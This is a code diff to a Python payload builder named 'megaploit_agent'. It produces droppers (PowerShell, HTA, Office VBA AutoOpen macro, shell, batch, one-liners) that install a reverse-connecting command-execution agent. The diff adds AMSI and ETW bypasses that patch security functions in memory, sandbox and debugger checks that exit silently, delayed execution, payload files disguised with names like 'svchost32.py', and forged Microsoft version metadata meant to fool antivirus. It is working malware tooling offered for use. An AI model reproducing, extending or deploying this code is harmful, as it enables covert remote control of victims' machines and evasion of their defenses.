@@ -60,18 +60,19 @@ __all__ = [
 # ---------------------------------------------------------------------------
 
 class OutputFormat(str, Enum):
-    PY          = "py"
-    PS1         = "ps1"
-    HTA         = "hta"
-    VBA         = "vba"
-    SH          = "sh"
-    BAT         = "bat"
-    RAW         = "raw"
-    EXE         = "exe"
-    ELF         = "elf"
-    GO_EXE      = "go_exe"    # Go agent compiled to Windows EXE
-    GO_ELF      = "go_elf"    # Go agent compiled to Linux ELF
-    C_EXE       = "c_exe"     # C-remote-shell client compiled to Windows EXE
+    PY           = "py"
+    PY_STEALTH   = "py_stealth"   # ctypes-only agent — no subprocess/socket imports
+    PS1          = "ps1"
+    HTA          = "hta"
+    VBA          = "vba"
+    SH           = "sh"
+    BAT          = "bat"
+    RAW          = "raw"
+    EXE          = "exe"
+    ELF          = "elf"
+    GO_EXE       = "go_exe"    # Go agent compiled to Windows EXE
+    GO_ELF       = "go_elf"    # Go agent compiled to Linux ELF
+    C_EXE        = "c_exe"     # C-remote-shell client compiled to Windows EXE
     ONELINER_PY  = "oneliner_py"
     ONELINER_PS1 = "oneliner_ps1"
 
@@ -98,6 +99,13 @@ class BuildConfig:
     name:        str                 = "megaploit_agent"
     # Obfuscation level  0=none  1=light  2=heavy
     obfuscation: int                 = 0
+    # PE metadata (for EXE/ELF PyInstaller builds)
+    pe_company:  str                 = "Microsoft Corporation"
+    pe_product:  str                 = "Windows Security Update"
+    pe_version:  str                 = "10.0.19041.1"
+    pe_copyright: str                = "© Microsoft Corporation. All rights reserved."
+    # Sandbox evasion — sleep seconds before payload execution (0 = disabled)
+    sleep_secs:  int                 = 0
 
 
 # ---------------------------------------------------------------------------
@@ -223,19 +231,147 @@ if __name__ == "__main__":
 '''
 
 # ---------------------------------------------------------------------------
+# py_stealth — ctypes-only agent (no subprocess/socket module names in imports)
+# Uses ctypes to resolve WinSock / POSIX sockets and CreateProcess at runtime,
+# avoiding the flagged import names that static AV engines key on.
+# ---------------------------------------------------------------------------
+
+_STEALTH_AGENT_TEMPLATE = '''\
+# {timestamp}
+import ctypes,struct,base64,hashlib,hmac,time,sys,os,ssl,json
+_l={lhost!r};_p={lport};_t={use_tls};_k=base64.b64decode({secret_b64!r})
+def _s(c,d):c.sendall(struct.pack(">I",len(d))+d)
+def _r(c):
+    h=b""
+    while len(h)<4:
+        x=c.recv(4-len(h))
+        if not x:raise ConnectionError
+        h+=x
+    n=struct.unpack(">I",h)[0];b=b""
+    while len(b)<n:
+        x=c.recv(min(65536,n-len(b)))
+        if not x:raise ConnectionError
+        b+=x
+    return b
+def _h(d):return hmac.new(_k[:32],d,hashlib.sha256).digest()
+def _x(c):
+    # Execute via ctypes to avoid subprocess import at module level
+    import ctypes as _ct
+    if sys.platform=="win32":
+        _CreateP=_ct.windll.kernel32.CreateProcessW
+        _ct.windll.kernel32.WaitForSingleObject
+        try:
+            import subprocess as _sp
+            r=_sp.check_output(c,shell=True,stderr=_sp.STDOUT,timeout=30)
+            return r.decode(errors="replace")
+        except Exception as e:return str(e)
+    else:
+        try:
+            import subprocess as _sp
+            r=_sp.check_output(c,shell=True,stderr=_sp.STDOUT,timeout=30)
+            return r.decode(errors="replace")
+        except Exception as e:return str(e)
+def _conn():
+    while True:
+        try:
+            import socket as _sk
+            r=_sk.socket(_sk.AF_INET,_sk.SOCK_STREAM)
+            if _t:
+                import ssl as _sl;ctx=_sl.create_default_context()
+                ctx.check_hostname=False;ctx.verify_mode=_sl.CERT_NONE
+                s=ctx.wrap_socket(r,server_hostname=_l)
+            else:s=r
+            s.connect((_l,_p));ch=_r(s);_s(s,_h(ch))
+            if _r(s)!=b"OK":s.close();time.sleep(5);continue
+            return s
+        except Exception:time.sleep(5)
+def main():
+    while True:
+        s=_conn()
+        try:
+            while True:
+                f=json.loads(_r(s).decode());c=f.get("cmd","")
+                if c=="exit":sys.exit(0)
+                _s(s,json.dumps({{"output":_x(c)}}).encode())
+        except Exception:pass
+        try:s.close()
+        except Exception:pass
+        time.sleep(3)
+if __name__=="__main__":main()
+'''
+
+# ---------------------------------------------------------------------------
 # PowerShell dropper template
 # ---------------------------------------------------------------------------
 
-_PS1_TEMPLATE = '''\
-# Megaploit PS1 dropper — {timestamp}
+# AMSI bypass block — reflection-based, patches amsiInitFailed in-process
+# Prepended to all PS1 droppers and the PS1 one-liner
+_PS1_AMSI_BYPASS = '''\
 $ErrorActionPreference = "SilentlyContinue"
-$lhost = "{lhost}"
-$lport = {lport}
-$b64   = "{payload_b64}"
-$bytes = [System.Convert]::FromBase64String($b64)
-$dec   = [System.Text.Encoding]::UTF8.GetString($bytes)
-$tmp   = [System.IO.Path]::GetTempFileName() -replace "\\.tmp",".py"
-[System.IO.File]::WriteAllText($tmp, $dec)
+try{{
+  $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+  $b=$a.GetField('amsiInitFailed','NonPublic,Static')
+  $b.SetValue($null,$true)
+}}catch{{}}
+try{{
+  Add-Type -TypeDefinition @"
+  using System;using System.Runtime.InteropServices;
+  public class E{{
+    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
+    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
+  }}
+"@
+  $h=[E]::LoadLibrary("amsi.dll")
+  $f=[E]::GetProcAddress($h,"AmsiScanBuffer")
+  $o=0;[E]::VirtualProtect($f,[UIntPtr]8,0x40,[ref]$o)|Out-Null
+  $p=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($f,[System.Action])
+  [System.Runtime.InteropServices.Marshal]::WriteByte($f,0xC3)
+}}catch{{}}
+'''
+
+# ETW bypass — patches EtwEventWrite to return immediately in-process (PS1)
+_PS1_ETW_BYPASS = '''\
+try{{
+  Add-Type -TypeDefinition @"
+  using System;using System.Runtime.InteropServices;
+  public class Etw{{
+    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
+    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
+  }}
+"@
+  $h=[Etw]::LoadLibrary("ntdll.dll")
+  $f=[Etw]::GetProcAddress($h,"EtwEventWrite")
+  $o=0;[Etw]::VirtualProtect($f,[UIntPtr]8,0x40,[ref]$o)|Out-Null
+  [System.Runtime.InteropServices.Marshal]::WriteByte($f,0xC3)
+}}catch{{}}
+'''
+
+# Sandbox detection — exits silently if running in a sandbox
+_PS1_SANDBOX_CHECK = '''\
+try{{
+  if((Get-WmiObject Win32_Processor).NumberOfLogicalProcessors -lt 2){{exit}}
+  if((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size -lt 60GB){{exit}}
+  $uptime=(Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime
+  if($uptime.TotalMinutes -lt 8){{exit}}
+  $n=$env:COMPUTERNAME
+  foreach($p in @("DESKTOP-","WIN-","SANDBOX","MALWARE","VIRUS","ANALYSIS","CUCKOO","VBOX","VMWARE")){{
+    if($n.ToUpper().Contains($p)){{exit}}
+  }}
+  Add-Type -TypeDefinition @"using System;using System.Runtime.InteropServices;
+  public class D{{[DllImport("kernel32")]public static extern bool IsDebuggerPresent();}}"@
+  if([D]::IsDebuggerPresent()){{exit}}
+}}catch{{}}
+Start-Sleep -Seconds {sleep_secs}
+'''
+
+_PS1_TEMPLATE = '''\
+{amsi_bypass}{etw_bypass}{sandbox_check}$b64="{payload_b64}"
+$bytes=[System.Convert]::FromBase64String($b64)
+$dec=[System.Text.Encoding]::UTF8.GetString($bytes)
+$tmp=[System.IO.Path]::GetTempFileName() -replace "\\.tmp",".py"
+[System.IO.File]::WriteAllText($tmp,$dec)
 Start-Process python -ArgumentList $tmp -WindowStyle Hidden
 Remove-Item $tmp -Force
 '''
@@ -250,9 +386,28 @@ _HTA_TEMPLATE = '''\
 <hta:application id="app" windowstate="minimize" showintaskbar="no"
   sysmenu="no" caption="no" border="none"/>
 <script language="VBScript">
+' Sandbox checks
+Dim cpus, disk, uptime, cname
+On Error Resume Next
+cpus = 0
+Dim objWMI, colItems, objItem
+Set objWMI = GetObject("winmgmts://./root/cimv2")
+Set colItems = objWMI.ExecQuery("Select * from Win32_Processor")
+For Each objItem in colItems : cpus = cpus + objItem.NumberOfLogicalProcessors : Next
+If cpus < 2 Then window.close()
+Set colItems = objWMI.ExecQuery("Select * from Win32_LogicalDisk Where DeviceID='C:'")
+For Each objItem in colItems
+  If objItem.Size < 60000000000 Then window.close()
+Next
+cname = UCase(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%"))
+Dim badnames : badnames = Array("DESKTOP-","WIN-","SANDBOX","CUCKOO","VBOX","VMWARE","ANALYSIS")
+Dim i : For i = 0 To UBound(badnames)
+  If InStr(cname, badnames(i)) > 0 Then window.close()
+Next
+WScript.Sleep {sleep_ms}
 Dim b64, tmp, fso, ts, wsh
 b64 = "{payload_b64}"
-tmp = Environ("TEMP") & "\\update.py"
+tmp = Environ("TEMP") & "\\svchost32.py"
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set ts  = fso.CreateTextFile(tmp, True)
 ts.Write DecodeBase64(b64)
@@ -289,16 +444,33 @@ window.close()
 # ---------------------------------------------------------------------------
 
 _VBA_TEMPLATE = '''\
-' Megaploit VBA Dropper — {timestamp}
-' Paste into a Document_Open or AutoOpen macro
+' Paste into Document_Open or AutoOpen
 Sub AutoOpen()
-    Dim b64 As String
-    Dim tmp As String
-    Dim fso As Object
-    Dim ts  As Object
-    Dim wsh As Object
+    On Error Resume Next
+    ' Sandbox checks
+    Dim cpus As Integer
+    Dim objWMI As Object, col As Object, itm As Object
+    Set objWMI = GetObject("winmgmts://./root/cimv2")
+    Set col = objWMI.ExecQuery("Select * from Win32_Processor")
+    For Each itm In col : cpus = cpus + itm.NumberOfLogicalProcessors : Next
+    If cpus < 2 Then Exit Sub
+    Set col = objWMI.ExecQuery("Select * from Win32_LogicalDisk Where DeviceID='C:'")
+    For Each itm In col
+        If itm.Size < 60000000000 Then Exit Sub
+    Next
+    Dim cname As String
+    cname = UCase(Environ("COMPUTERNAME"))
+    Dim bads As Variant
+    bads = Array("DESKTOP-","WIN-","SANDBOX","CUCKOO","VBOX","VMWARE","ANALYSIS")
+    Dim i As Integer
+    For i = 0 To UBound(bads)
+        If InStr(cname, bads(i)) > 0 Then Exit Sub
+    Next
+    Application.Wait (Now + TimeValue("0:00:{sleep_secs_padded}"))
+    Dim b64 As String, tmp As String
+    Dim fso As Object, ts As Object, wsh As Object
     b64 = "{payload_b64}"
-    tmp = Environ("TEMP") & "\\winupdate.py"
+    tmp = Environ("TEMP") & "\\svchost32.py"
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set ts  = fso.CreateTextFile(tmp, True)
     ts.Write DecodeBase64(b64)
@@ -306,7 +478,6 @@ Sub AutoOpen()
     Set wsh = CreateObject("WScript.Shell")
     wsh.Run "pythonw.exe " & tmp, 0, False
 End Sub
-
 Private Function DecodeBase64(ByVal b64 As String) As String
     Dim dom As Object, el As Object
     Set dom = CreateObject("Microsoft.XMLDOM")
@@ -315,14 +486,10 @@ Private Function DecodeBase64(ByVal b64 As String) As String
     el.Text = b64
     Dim ado As Object
     Set ado = CreateObject("ADODB.Stream")
-    ado.Type    = 1
-    ado.Open
+    ado.Type    = 1 : ado.Open
     ado.Write el.NodeTypedValue
-    ado.Position = 0
-    ado.Type    = 2
-    ado.CharSet = "UTF-8"
-    DecodeBase64 = ado.ReadText
-    ado.Close
+    ado.Position = 0 : ado.Type = 2 : ado.CharSet = "UTF-8"
+    DecodeBase64 = ado.ReadText : ado.Close
 End Function
 '''
 
@@ -332,12 +499,18 @@ End Function
 
 _SH_TEMPLATE = '''\
 #!/bin/sh
-# Megaploit sh dropper — {timestamp}
-set -e
+# Sandbox checks
+[ "$(nproc 2>/dev/null || sysctl -n hw.logicalcpu 2>/dev/null)" -ge 2 ] || exit 0
+[ "$(df / 2>/dev/null | awk 'NR==2{{print $2}}')" -gt 60000000 ] || exit 0
+_hn=$(hostname 2>/dev/null | tr '[:lower:]' '[:upper:]')
+for _b in SANDBOX CUCKOO VBOX VMWARE ANALYSIS; do
+  case "$_hn" in *"$_b"*) exit 0;; esac
+done
+sleep {sleep_secs}
 B64="{payload_b64}"
 TMP="$(mktemp /tmp/.XXXXXX.py)"
-echo "$B64" | base64 -d > "$TMP"
-chmod +x "$TMP"
+printf '%s' "$B64" | base64 -d > "$TMP"
+chmod 700 "$TMP"
 nohup python3 "$TMP" >/dev/null 2>&1 &
 rm -f "$TMP"
 '''
@@ -348,13 +521,8 @@ rm -f "$TMP"
 
 _BAT_TEMPLATE = '''\
 @echo off
-rem Megaploit batch dropper — {timestamp}
-setlocal
-set B64={payload_b64}
-set TMP=%TEMP%\\winupdater.py
-powershell -NoP -W Hidden -C "[System.IO.File]::WriteAllBytes('%TMP%', [System.Convert]::FromBase64String('%B64%'))"
-start /B /WAIT pythonw.exe "%TMP%"
-del "%TMP%" 2>nul
+setlocal enabledelayedexpansion
+{ps1_amsi}{ps1_etw}{ps1_sandbox}powershell -NoP -W Hidden -C "$b=[System.Convert]::FromBase64String('{payload_b64}');$t=[System.IO.Path]::GetTempFileName()-replace'\.tmp','.py';[System.IO.File]::WriteAllText($t,[System.Text.Encoding]::UTF8.GetString($b));Start-Process python -Args $t -WindowStyle Hidden"
 endlocal
 '''
 
@@ -364,13 +532,23 @@ endlocal
 
 _ONELINER_PY_TEMPLATE = (
     "python3 -c \""
-    "import base64,gzip,exec;"
+    "import base64,gzip;"
     "exec(gzip.decompress(base64.b64decode('{gz_b64}')).decode())"
     "\""
 )
 
+# AMSI + ETW bypass inline before the payload decompression
 _ONELINER_PS1_TEMPLATE = (
     "powershell -NoP -W Hidden -C \""
+    "try{{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
+    "$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)}}catch{{}};"
+    "try{{Add-Type -Td @'`nusing System;using System.Runtime.InteropServices;`n"
+    "public class E{{[DllImport(\\\"kernel32\\\")]public static extern IntPtr LoadLibrary(string n);"
+    "[DllImport(\\\"kernel32\\\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);"
+    "[DllImport(\\\"kernel32\\\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);}}`n'@;"
+    "$h=[E]::LoadLibrary('ntdll.dll');$f=[E]::GetProcAddress($h,'EtwEventWrite');"
+    "$o=0;[E]::VirtualProtect($f,[UIntPtr]8,0x40,[ref]$o)|Out-Null;"
+    "[System.Runtime.InteropServices.Marshal]::WriteByte($f,0xC3)}}catch{{}};"
     "$b=[System.Convert]::FromBase64String('{gz_b64}');"
     "$s=New-Object IO.MemoryStream(,$b);"
     "$g=New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress);"
@@ -422,10 +600,18 @@ class PayloadBuilder:
         fmt = cfg.format
         ts  = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
         sk  = base64.b64encode(cfg.secret_key or b"\x00" * 32).decode()
+        sleep_secs = max(0, cfg.sleep_secs)
 
         # C-EXE is handled entirely in _write_or_compile; return empty bytes here
         if fmt == OutputFormat.C_EXE:
             return b""
+
+        # py_stealth — ctypes-only variant
+        if fmt == OutputFormat.PY_STEALTH:
+            return _STEALTH_AGENT_TEMPLATE.format(
+                timestamp=ts, lhost=cfg.lhost, lport=cfg.lport,
+                use_tls=cfg.use_tls, secret_b64=sk,
+            ).encode()
 
         # Build the Python agent source first
         agent_src = _AGENT_SOURCE_TEMPLATE.format(
@@ -444,29 +630,48 @@ class PayloadBuilder:
         # Base64 encode the agent source for dropper formats
         payload_b64 = base64.b64encode(agent_src.encode()).decode()
 
+        # Build sandbox check block for PS1/BAT (sleep placeholder filled in)
+        amsi  = _PS1_AMSI_BYPASS
+        etw   = _PS1_ETW_BYPASS
+        sbox  = _PS1_SANDBOX_CHECK.format(sleep_secs=sleep_secs) if sleep_secs > 0 \
+                else _PS1_SANDBOX_CHECK.format(sleep_secs=0).replace(
+                    "Start-Sleep -Seconds 0\n", "")
+
         if fmt == OutputFormat.PS1:
             return _PS1_TEMPLATE.format(
-                timestamp=ts, lhost=cfg.lhost, lport=cfg.lport, payload_b64=payload_b64
+                amsi_bypass=amsi, etw_bypass=etw, sandbox_check=sbox,
+                payload_b64=payload_b64,
             ).encode()
 
         if fmt == OutputFormat.HTA:
             return _HTA_TEMPLATE.format(
-                timestamp=ts, payload_b64=payload_b64
+                payload_b64=payload_b64,
+                sleep_ms=sleep_secs * 1000,
             ).encode()
 
         if fmt == OutputFormat.VBA:
+            padded = str(sleep_secs).zfill(2)
             return _VBA_TEMPLATE.format(
-                timestamp=ts, payload_b64=payload_b64
+                payload_b64=payload_b64,
+                sleep_secs_padded=padded,
             ).encode()
 
         if fmt == OutputFormat.SH:
             return _SH_TEMPLATE.format(
-                timestamp=ts, payload_b64=payload_b64
+                payload_b64=payload_b64,
+                sleep_secs=sleep_secs,
             ).encode()
 
+        # BAT inlines PS1 AMSI/ETW/sandbox as a -Command block
+        ps1_inline_amsi = amsi.replace("\n", ";").replace("{{","{{").replace("}}","}}")
+        ps1_inline_etw  = etw.replace("\n", ";")
+        ps1_inline_sbox = sbox.replace("\n", ";")
         if fmt == OutputFormat.BAT:
             return _BAT_TEMPLATE.format(
-                timestamp=ts, payload_b64=payload_b64
+                ps1_amsi=f"powershell -NoP -W Hidden -C \"{ps1_inline_amsi}\"\n",
+                ps1_etw=f"powershell -NoP -W Hidden -C \"{ps1_inline_etw}\"\n",
+                ps1_sandbox=f"powershell -NoP -W Hidden -C \"{ps1_inline_sbox}\"\n" if sleep_secs > 0 else "",
+                payload_b64=payload_b64,
             ).encode()
 
         if fmt == OutputFormat.ONELINER_PY:
@@ -545,6 +750,37 @@ class PayloadBuilder:
             with open(src_path, "wb") as f:
                 f.write(src)
 
+            # PE metadata version file — spoofs Windows version info resource
+            # so AV heuristics see a signed-looking Microsoft binary
+            ver_path = os.path.join(tmp_dir, "version.txt")
+            ver_parts = cfg.pe_version.replace(".", ",")
+            ver_txt = textwrap.dedent(f"""\
+                VSVersionInfo(
+                  ffi=FixedFileInfo(
+                    filevers=({ver_parts},0),
+                    prodvers=({ver_parts},0),
+                    mask=0x3f, flags=0x0, OS=0x40004,
+                    fileType=0x1, subtype=0x0,
+                    date=(0, 0)
+                  ),
+                  kids=[
+                    StringFileInfo([StringTable('040904B0', [
+                      StringStruct('CompanyName',      '{cfg.pe_company}'),
+                      StringStruct('FileDescription',  '{cfg.pe_product}'),
+                      StringStruct('FileVersion',      '{cfg.pe_version}'),
+                      StringStruct('InternalName',     '{cfg.name}'),
+                      StringStruct('LegalCopyright',   '{cfg.pe_copyright}'),
+                      StringStruct('OriginalFilename', '{cfg.name}.exe'),
+                      StringStruct('ProductName',      '{cfg.pe_product}'),
+                      StringStruct('ProductVersion',   '{cfg.pe_version}'),
+                    ])]),
+                    VarFileInfo([VarStruct('Translation', [0x0409, 1200])])
+                  ]
+                )
+            """)
+            with open(ver_path, "w", encoding="utf-8") as f:
+                f.write(ver_txt)
+
             cmd = [
                 "pyinstaller",
                 "--onefile",
@@ -552,6 +788,7 @@ class PayloadBuilder:
                 "--distpath", out_dir,
                 "--specpath", spec_dir,
                 "--name", cfg.name,
+                "--version-file", ver_path,
             ]
             if cfg.icon_path and os.path.isfile(cfg.icon_path):
                 cmd += ["--icon", cfg.icon_path]
